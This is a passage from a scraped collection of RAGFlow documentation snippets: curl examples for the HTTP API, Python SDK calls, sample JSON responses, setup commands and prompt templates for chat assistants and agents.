graph structure, and metadata. Includes timestamps, user information, and workflow configuration data.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_66\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 0,\n    \"data\": [\n        {\n            \"avatar\": null,\n            \"canvas_type\": null,\n            \"create_date\": \"Thu, 05 Dec 2024 19:10:36 GMT\",\n            \"create_time\": 1733397036424,\n            \"description\": null,\n            \"dsl\": {\n                \"answer\": [],\n                \"components\": {\n                    \"begin\": {\n                        \"downstream\": [],\n                        \"obj\": {\n                            \"component_name\": \"Begin\",\n                            \"params\": {}\n                        },\n                        \"upstream\": []\n                    }\n                },\n                \"graph\": {\n                    \"edges\": [],\n                    \"nodes\": [\n                        {\n                            \"data\": {\n                                \"label\": \"Begin\",\n                                \"name\": \"begin\"\n                            },\n                            \"height\": 44,\n                            \"id\": \"begin\",\n                            \"position\": {\n                                \"x\": 50,\n                                \"y\": 200\n                            },\n                            \"sourcePosition\": \"left\",\n                            \"targetPosition\": \"right\",\n                            \"type\": \"beginNode\",\n                            \"width\": 200\n                        }\n                    ]\n                },\n                \"history\": [],\n                \"messages\": [],\n                \"path\": [],\n                \"reference\": []\n            },\n            \"id\": \"8d9ca0e2b2f911ef9ca20242ac120006\",\n            \"title\": \"123465\",\n            \"update_date\": \"Thu, 05 Dec 2024 19:10:56 GMT\",\n            \"update_time\": 1733397056801,\n            \"user_id\": \"69736c5e723611efb51b0242ac120007\"\n        }\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Create Session Request Example\nDESCRIPTION: cURL command example for creating a new chat session, showing required headers and body parameters.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_36\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/chats/{chat_id}/sessions \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {\n          \"name\": \"new session\"\n     }'\n```\n\n----------------------------------------\n\nTITLE: Chat Completion Stream Response Format\nDESCRIPTION: Example JSON response format for a streaming chat completion. This shows both the initial response chunk with metadata and subsequent content chunks, ending with a final chunk containing usage statistics.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"id\": \"chatcmpl-3a9c3572f29311efa69751e139332ced\",\n    \"choices\": [\n        {\n            \"delta\": {\n                \"content\": \"This is a test. If you have any specific questions or need information, feel\",\n                \"role\": \"assistant\",\n                \"function_call\": null,\n                \"tool_calls\": null\n            },\n            \"finish_reason\": null,\n            \"index\": 0,\n            \"logprobs\": null\n        }\n    ],\n    \"created\": 1740543996,\n    \"model\": \"model\",\n    \"object\": \"chat.completion.chunk\",\n    \"system_fingerprint\": \"\",\n    \"usage\": null\n}\n// omit duplicated information\n{\"choices\":[{\"delta\":{\"content\":\" free to ask, and I will do my best to provide an answer based on\",\"role\":\"assistant\"}}]}\n{\"choices\":[{\"delta\":{\"content\":\" the knowledge I have. If your question is unrelated to the provided knowledge base,\",\"role\":\"assistant\"}}]}\n{\"choices\":[{\"delta\":{\"content\":\" I will let you know.\",\"role\":\"assistant\"}}]}\n// the last chunk\n{\n    \"id\": \"chatcmpl-3a9c3572f29311efa69751e139332ced\",\n    \"choices\": [\n        {\n            \"delta\": {\n                \"content\": null,\n                \"role\": \"assistant\",\n                \"function_call\": null,\n                \"tool_calls\": null\n            },\n            \"finish_reason\": \"stop\",\n            \"index\": 0,\n            \"logprobs\": null\n        }\n    ],\n    \"created\": 1740543996,\n    \"model\": \"model\",\n    \"object\": \"chat.completion.chunk\",\n    \"system_fingerprint\": \"\",\n    \"usage\": {\n        \"prompt_tokens\": 18,\n        \"completion_tokens\": 225,\n        \"total_tokens\": 243\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring DB_Description Knowledge Base in RAGFlow\nDESCRIPTION: This snippet shows the structure and content for the DB_Description knowledge base, including tables for Products, Orders, and OrderDetails with their respective field descriptions.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/agent/text2sql_agent.md#2025-04-10_snippet_4\n\nLANGUAGE: plaintext\nCODE:\n```\n### Products (Product Information Table)\nThe Products table contains information about the products offered by the online store. Each field within this table represents:\n- ProductID: A unique identifier for a product, auto-incremented.\n- ProductName: The name of the product, such as laptop, smartphone, nounch, etc.\n- Description: Detailed information about the product.\n- Price: The selling price of the product, stored as a decimal value to accommodate currency formatting.\n- StockQuantity: The quantity of the product available in stock.\n\n### Orders (Order Information Table)\nThe Orders table tracks orders placed by customers. This table includes fields that denote:\n- OrderID: A unique identifier for an order, auto-incremented.\n- CustomerID: A foreign key that references the CustomerID in the Customers table, indicating which customer placed the order.\n- OrderDate: The date when the order was placed.\n- TotalPrice: The total price of all items in the order, calculated at the time of purchase.\n\n### OrderDetails (Order Details Table)\nThe OrderDetails table provides detailed information about each item in an order. Fields within this table include:\n- OrderDetailID: A unique identifier for each line item in an order, auto-incremented.\n- OrderID: A foreign key that references the OrderID in the Orders table, linking the detail to a specific order.\n- ProductID: A foreign key that references the ProductID in the Products table, specifying which product was ordered.\n- UnitPrice: The price per unit of the product at the time of order.\n- Quantity: The number of units of the product ordered.\n- TotalPrice: The total price for this particular item in the order, calculated as UnitPrice * Quantity.\n```\n\n----------------------------------------\n\nTITLE: Successful Chat Response Format\nDESCRIPTION: Example response format when successfully retrieving chat details, showing chat configuration including LLM settings and prompt templates.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_35\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 0,\n    \"data\": [\n        {\n            \"avatar\": \"\",\n            \"create_date\": \"Fri, 18 Oct 2024 06:20:06 GMT\",\n            \"create_time\": 1729232406637,\n            \"description\": \"A helpful Assistant\",\n            \"do_refer\": \"1\",\n            \"id\": \"04d0d8e28d1911efa3630242ac120006\",\n            \"dataset_ids\": [\"527fa74891e811ef9c650242ac120006\"],\n            \"language\": \"English\",\n            \"llm\": {\n                \"frequency_penalty\": 0.7,\n                \"model_name\": \"qwen-plus@Tongyi-Qianwen\",\n                \"presence_penalty\": 0.4,\n                \"temperature\": 0.1,\n                \"top_p\": 0.3\n            },\n            \"name\": \"13243\",\n            \"prompt\": {\n                \"empty_response\": \"Sorry! No relevant content was found in the knowledge base!\",\n                \"keywords_similarity_weight\": 0.3,\n                \"opener\": \"Hi! I'm your assistant, what can I do for you?\",\n                \"prompt\": \"You are an intelligent assistant. Please summarize the content of the knowledge base to answer the question. Please list the data in the knowledge base and answer in detail. When all knowledge base content is irrelevant to the question, your answer must include the sentence \\\"The answer you are looking for is not found in the knowledge base!\\\" Answers need to consider chat history.\\n\",\n                \"rerank_model\": \"\",\n                \"similarity_threshold\": 0.2,\n                \"top_n\": 6,\n                \"variables\": [\n                    {\n                        \"key\": \"knowledge\",\n                        \"optional\": false\n                    }\n                ]\n            },\n            \"prompt_type\": \"simple\",\n            \"status\": \"1\",\n            \"tenant_id\": \"69736c5e723611efb51b0242ac120007\",\n            \"top_k\": 1024,\n            \"update_date\": \"Fri, 18 Oct 2024 06:20:06 GMT\",\n            \"update_time\": 1729232406638\n        }\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Cloning and Setting Up RAGFlow Development Environment\nDESCRIPTION: Commands to clone the RAGFlow repository and install Python dependencies using UV. This sets up the development environment for RAGFlow.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\nuv sync --python 3.10 --all-extras # install RAGFlow dependent python modules\n```\n\n----------------------------------------\n\nTITLE: Starting RAGFlow Server with Docker Compose\nDESCRIPTION: Docker Compose commands to start the RAGFlow server using CPU or GPU for embedding and DeepDoc tasks.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/quickstart.mdx#2025-04-10_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n# Use CPU for embedding and DeepDoc tasks:\n$ docker compose -f docker-compose.yml up -d\n\n# To use GPU to accelerate embedding and DeepDoc tasks:\n# docker compose -f docker-compose-gpu.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Successful Response for Retrieving Chat Assistant\nDESCRIPTION: Example JSON response when successfully retrieving a chat assistant. Shows the complete structure with fields including ID, name, creation details, LLM configuration, and prompt settings.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_27\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 0,\n    \"data\": {\n        \"avatar\": \"\",\n        \"create_date\": \"Thu, 24 Oct 2024 11:18:29 GMT\",\n        \"create_time\": 1729768709023,\n        \"dataset_ids\": [\n            \"527fa74891e811ef9c650242ac120006\"\n        ],\n        \"description\": \"A helpful Assistant\",\n        \"do_refer\": \"1\",\n        \"id\": \"b1f2f15691f911ef81180242ac120003\",\n        \"language\": \"English\",\n        \"llm\": {\n            \"frequency_penalty\": 0.7,\n            \"model_name\": \"qwen-plus@Tongyi-Qianwen\",\n            \"presence_penalty\": 0.4,\n            \"temperature\": 0.1,\n            \"top_p\": 0.3\n        },\n        \"name\": \"12234\",\n        \"prompt\": {\n            \"empty_response\": \"Sorry! No relevant content was found in the knowledge base!\",\n            \"keywords_similarity_weight\": 0.3,\n            \"opener\": \"Hi! I'm your assistant, what can I do for you?\",\n            \"prompt\": \"You are an intelligent assistant. Please summarize the content of the knowledge base to answer the question. Please list the data in the knowledge base and answer in detail. When all knowledge base content is irrelevant to the question, your answer must include the sentence \\\"The answer you are looking for is not found in the knowledge base!\\\" Answers need to consider chat history.\\n \",\n            \"rerank_model\": \"\",\n            \"similarity_threshold\": 0.2,\n            \"top_n\": 6,\n            \"variables\": [\n                {\n                    \"key\": \"knowledge\",\n                    \"optional\": false\n                }\n            ]\n        },\n        \"prompt_type\": \"simple\",\n        \"status\": \"1\",\n        \"tenant_id\": \"69736c5e723611efb51b0242ac120007\",\n        \"top_k\": 1024,\n        \"update_date\": \"Thu, 24 Oct 2024 11:18:29 GMT\",\n        \"update_time\": 1729768709023\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding a Chunk to a Document in Python using RAGFlow SDK\nDESCRIPTION: This snippet demonstrates how to add a chunk to a document using the RAGFlow SDK. It initializes a RAGFlow object, retrieves a dataset and document, then adds a chunk to the document.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_14\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndatasets = rag_object.list_datasets(id=\"123\")\ndataset = datasets[0]\ndoc = dataset.list_documents(id=\"wdfxb5t547d\")\ndoc = doc[0]\nchunk = doc.add_chunk(content=\"xxxxxxx\")\n```\n\n----------------------------------------\n\nTITLE: Example System Prompt with Variables in RAGFlow\nDESCRIPTION: An example system prompt template that includes both the reserved {knowledge} variable and a custom {style} variable to control the tone of the assistant's responses.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/chat/set_chat_variables.md#2025-04-10_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nYou are an intelligent assistant. Please answer the question by summarizing chunks from the specified knowledge base(s)...\n\nYour answers should follow a professional and {style} style.\n\nHere is the knowledge base:\n{knowledge}\nThe above is the knowledge base.\n```\n\n----------------------------------------\n\nTITLE: Updating Chunk in Document (PUT)\nDESCRIPTION: Sends a PUT request to update content or configurations for a specified chunk. Allows modifying content, keywords, and availability.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_22\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request PUT \\\n     --url http://{address}/api/v1/datasets/{dataset_id}/documents/{document_id}/chunks/{chunk_id} \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {   \n          \"content\": \"ragflow123\",  \n          \"important_keywords\": []  \n     }'\n```\n\n----------------------------------------\n\nTITLE: Accessing Chat Assistant Sessions Example in RAGFlow\nDESCRIPTION: Example showing how to retrieve a chat assistant by name and list its sessions using the RAGFlow SDK.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_27\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\nassistant = rag_object.list_chats(name=\"Miss R\")\nassistant = assistant[0]\nfor session in assistant.list_sessions():\n    print(session)\n```\n\n----------------------------------------\n\nTITLE: Configuring System Prompt for Generate Component in RagFlow\nDESCRIPTION: Example of a system prompt for a Generate component in the Interpreter template. It instructs the LLM to provide suggestions for improving a translation, using variables for source text, target language, and initial translation.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/agent/agent_component_reference/generate.mdx#2025-04-10_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nYour task is to read a source text and a translation to {target_lang}, and give constructive suggestions to improve the translation. The source text and initial translation, delimited by XML tags <SOURCE_TEXT></SOURCE_TEXT> and <TRANSLATION></TRANSLATION>, are as follows:\n\n<SOURCE_TEXT>\n{source_text}\n</SOURCE_TEXT>\n\n<TRANSLATION>\n{translation_1}\n</TRANSLATION>\n\nWhen writing suggestions, pay attention to whether there are ways to improve the translation's fluency, by applying {target_lang} grammar, spelling and punctuation rules, and ensuring there are no unnecessary repetitions.\n- Each suggestion should address one specific part of the translation.\n- Output the suggestions only.\n```\n\n----------------------------------------\n\nTITLE: Parsing Documents in Dataset (POST)\nDESCRIPTION: Sends a POST request to parse specified documents within a dataset. Requires document IDs in the request body.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_17\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/datasets/{dataset_id}/chunks \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {\n          \"document_ids\": [\"97a5f1c2759811efaa500242ac120004\",\"97ad64b6759811ef9fc30242ac120004\"]\n     }'\n```\n\n----------------------------------------\n\nTITLE: Initializing IPEX-LLM Ollama\nDESCRIPTION: Platform-specific commands for initializing Ollama with IPEX-LLM\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nconda activate llm-cpp\ninit-ollama\n```\n\nLANGUAGE: cmd\nCODE:\n```\nconda activate llm-cpp\ninit-ollama.bat\n```\n\n----------------------------------------\n\nTITLE: Creating OpenAI-Compatible Agent Completion Request\nDESCRIPTION: Example curl command for creating an agent completion through the OpenAI-compatible API endpoint. This request sends a user message to the specified agent ID and requests streaming responses.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/agents_openai/{agent_id}/chat/completions \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '{\n        \"model\": \"model\",\n        \"messages\": [{\"role\": \"user\", \"content\": \"Say this is a test!\"}],\n        \"stream\": true\n      }'\n```\n\n----------------------------------------\n\nTITLE: Creating Agent Session without Parameters using cURL\nDESCRIPTION: Example cURL command to create a session with an agent when no parameters are required. This API call initializes a conversation with the specified agent.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_44\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/agents/{agent_id}/sessions \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '{\n     }'\n```\n\n----------------------------------------\n\nTITLE: Failed Retrieval Response in JSON\nDESCRIPTION: This snippet illustrates the structure of an error response from the RAGFlow retrieval endpoint when required parameters are missing.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_25\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 102,\n    \"message\": \"`datasets` is required.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Listing Documents in RAGFlow Dataset (Bash)\nDESCRIPTION: Sends a GET request to list documents in a specified dataset. Includes optional query parameters for pagination, sorting, and filtering.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request GET \\\n     --url http://{address}/api/v1/datasets/{dataset_id}/documents?page={page}&page_size={page_size}&orderby={orderby}&desc={desc}&keywords={keywords}&id={document_id}&name={document_name} \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>'\n```\n\n----------------------------------------\n\nTITLE: Creating Chat Assistant in Bash\nDESCRIPTION: This snippet shows how to send a POST request to create a new chat assistant using the RAGFlow API. It includes the necessary headers and a JSON payload with name and dataset parameters.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_26\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/chats \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '{\n    \"dataset_ids\": [\"0b2cbc8c877f11ef89070242ac120005\"],\n    \"name\":\"new_chat_1\"\n}'\n```\n\n----------------------------------------\n\nTITLE: Error Response for Update Operation\nDESCRIPTION: Example error response when there's a failure in updating a chat assistant, such as trying to use a duplicate name.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_31\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 102,\n    \"message\": \"Duplicated chat name in updating dataset.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Chunk to Document (POST)\nDESCRIPTION: Sends a POST request to add a chunk to a specified document within a dataset. Requires chunk content in the request body.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_19\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/datasets/{dataset_id}/documents/{document_id}/chunks \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {\n          \"content\": \"<CHUNK_CONTENT_HERE>\"\n     }'\n```\n\n----------------------------------------\n\nTITLE: Error Response for Delete Operation\nDESCRIPTION: Example error response when there's a failure in deleting chat assistants, such as when required IDs are not provided.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_33\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 102,\n    \"message\": \"ids are required\"\n}\n```\n\n----------------------------------------\n\nTITLE: Successful Response with Begin Component Parameters (JSON)\nDESCRIPTION: This JSON response shows a successful completion without a provided session ID but with parameters specified in the Begin component. It includes the new session ID and parameter details.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_53\n\nLANGUAGE: json\nCODE:\n```\ndata:{\n    \"code\": 0,\n    \"message\": \"\",\n    \"data\": {\n        \"session_id\": \"eacb36a0bdff11ef97120242ac120006\",\n        \"answer\": \"\",\n        \"reference\": [],\n        \"param\": [\n            {\n                \"key\": \"lang\",\n                \"name\": \"Target Language\",\n                \"optional\": false,\n                \"type\": \"line\",\n                \"value\": \"English\"\n            },\n            {\n                \"key\": \"file\",\n                \"name\": \"Files\",\n                \"optional\": false,\n                \"type\": \"file\",\n                \"value\": \"How is the weather tomorrow?\"\n            },\n            {\n                \"key\": \"hhyt\",\n                \"name\": \"hhty\",\n                \"optional\": true,\n                \"type\": \"line\"\n            }\n        ]\n    }\n}\ndata:\n```\n\n----------------------------------------\n\nTITLE: Listing Chunks in Document (GET)\nDESCRIPTION: Sends a GET request to list chunks in a specified document. Supports filtering by keywords, pagination, and chunk ID.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_20\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request GET \\\n     --url http://{address}/api/v1/datasets/{dataset_id}/documents/{document_id}/chunks?keywords={keywords}&page={page}&page_size={page_size}&id={chunk_id} \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>'\n```\n\n----------------------------------------\n\nTITLE: Error Response for Chat Completion in JSON\nDESCRIPTION: Example JSON response format for a failed chat completion request. The response includes an error code and a message indicating the reason for failure.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_43\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 102,\n    \"message\": \"Please input your question.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Setting RAGFlow Environment for Official Release\nDESCRIPTION: Configuration for .env file to use a specific official release version (v0.17.2) of the RAGFlow Docker image.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/upgrade_ragflow.mdx#2025-04-10_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nRAGFLOW_IMAGE=infiniflow/ragflow:v0.17.2\n```\n\n----------------------------------------\n\nTITLE: Deleting Chunks from Document (DELETE)\nDESCRIPTION: Sends a DELETE request to remove specified chunks from a document. Requires chunk IDs in the request body.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_21\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request DELETE \\\n     --url http://{address}/api/v1/datasets/{dataset_id}/documents/{document_id}/chunks \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {\n          \"chunk_ids\": [\"test_1\", \"test_2\"]\n     }'\n```\n\n----------------------------------------\n\nTITLE: Error Response for Agent Session Creation in JSON\nDESCRIPTION: Example JSON response format for a failed agent session creation request. The response includes an error code and message indicating that the specified agent was not found.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_48\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 102,\n    \"message\": \"Agent not found.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Launching RAGFlow Frontend Service for Development\nDESCRIPTION: Command to start the RAGFlow frontend service in development mode using npm.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Curl Request for Updating a Chat Assistant\nDESCRIPTION: Example curl command for updating an existing chat assistant by its ID. This example shows how to update just the name property.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_29\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request PUT \\\n     --url http://{address}/api/v1/chats/{chat_id} \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {\n          \"name\":\"Test\"\n     }'\n```\n\n----------------------------------------\n\nTITLE: Successful Response without Session ID (JSON)\nDESCRIPTION: This JSON response shows a successful completion without a provided session ID and no parameters specified in the Begin component. It includes the generated answer and a new session ID.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_52\n\nLANGUAGE: json\nCODE:\n```\ndata:{\n    \"code\": 0,\n    \"message\": \"\",\n    \"data\": {\n        \"answer\": \"Hi! I'm your smart assistant. What can I do for you?\",\n        \"reference\": {},\n        \"id\": \"31e6091d-88d4-441b-ac65-eae1c055be7b\",\n        \"session_id\": \"2987ad3eb85f11efb2a70242ac120005\"\n    }\n}\ndata:{\n    \"code\": 0,\n    \"message\": \"\",\n    \"data\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Deleting Documents from RAGFlow Dataset (Bash)\nDESCRIPTION: Sends a DELETE request to remove specific documents from a dataset. Requires dataset ID in the URL and document IDs in the request body.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request DELETE \\\n     --url http://{address}/api/v1/datasets/{dataset_id}/documents \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {\n          \"ids\": [\"id_1\",\"id_2\"]\n     }'\n```\n\n----------------------------------------\n\nTITLE: Update Session Request Example\nDESCRIPTION: cURL command example for updating an existing chat session's details.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_37\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request PUT \\\n     --url http://{address}/api/v1/chats/{chat_id}/sessions/{session_id} \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {\n          \"name\": \"<REVISED_SESSION_NAME_HERE>\"\n     }'\n```\n\n----------------------------------------\n\nTITLE: Creating Agent Session with File Upload using cURL\nDESCRIPTION: Example cURL command to create a session with an agent while uploading a file. This multipart/form-data request allows sending files to be processed by the agent when initializing the session.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_46\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/agents/{agent_id}/sessions?user_id={user_id} \\\n     --header 'Content-Type: multipart/form-data' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --form '<FILE_KEY>=@./test1.png'    \n```\n\n----------------------------------------\n\nTITLE: Stopping Document Parsing (DELETE)\nDESCRIPTION: Sends a DELETE request to stop parsing specified documents within a dataset. Requires document IDs in the request body.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_18\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request DELETE \\\n     --url http://{address}/api/v1/datasets/{dataset_id}/chunks \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {\n          \"document_ids\": [\"97a5f1c2759811efaa500242ac120004\",\"97ad64b6759811ef9fc30242ac120004\"]\n     }'\n```\n\n----------------------------------------\n\nTITLE: List Sessions Request Example\nDESCRIPTION: cURL command example for retrieving a list of chat sessions with optional filtering parameters.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_38\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request GET \\\n     --url http://{address}/api/v1/chats/{chat_id}/sessions?page={page}&page_size={page_size}&orderby={orderby}&desc={desc}&name={session_name}&id={session_id} \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>'\n```\n\n----------------------------------------\n\nTITLE: Delete Agent Sessions Request Example\nDESCRIPTION: Demonstrates how to make a DELETE request to remove specific sessions from an agent, including authentication and request body with session IDs.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_61\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request DELETE \\\n     --url http://{address}/api/v1/agents/{agent_id}/sessions \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {\n          \"ids\": [\"test_1\", \"test_2\"]\n     }'\n```\n\n----------------------------------------\n\nTITLE: Canceling Document Parsing in RAGFlow SDK (Python)\nDESCRIPTION: Stops the parsing process for specified documents in a RAGFlow dataset. This function cancels the ongoing parsing of documents identified by their IDs.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_12\n\nLANGUAGE: python\nCODE:\n```\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndataset = rag_object.create_dataset(name=\"dataset_name\")\ndocuments = [\n    {'display_name': 'test1.txt', 'blob': open('./test_data/test1.txt',\"rb\").read()},\n    {'display_name': 'test2.txt', 'blob': open('./test_data/test2.txt',\"rb\").read()},\n    {'display_name': 'test3.txt', 'blob': open('./test_data/test3.txt',\"rb\").read()}\n]\ndataset.upload_documents(documents)\ndocuments = dataset.list_documents(keywords=\"test\")\nids = []\nfor document in documents:\n    ids.append(document.id)\ndataset.async_parse_documents(ids)\nprint(\"Async bulk parsing initiated.\")\ndataset.async_cancel_parse_documents(ids)\nprint(\"Async bulk parsing cancelled.\")\n```\n\n----------------------------------------\n\nTITLE: Delete Sessions Request Example\nDESCRIPTION: cURL command example for deleting one or more chat sessions by their IDs.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_39\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request DELETE \\\n     --url http://{address}/api/v1/chats/{chat_id}/sessions \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {\n          \"ids\": [\"test_1\", \"test_2\"]\n     }'\n```\n\n----------------------------------------\n\nTITLE: Downloading Document from RAGFlow Dataset (Bash)\nDESCRIPTION: Sends a GET request to download a specific document from a dataset. 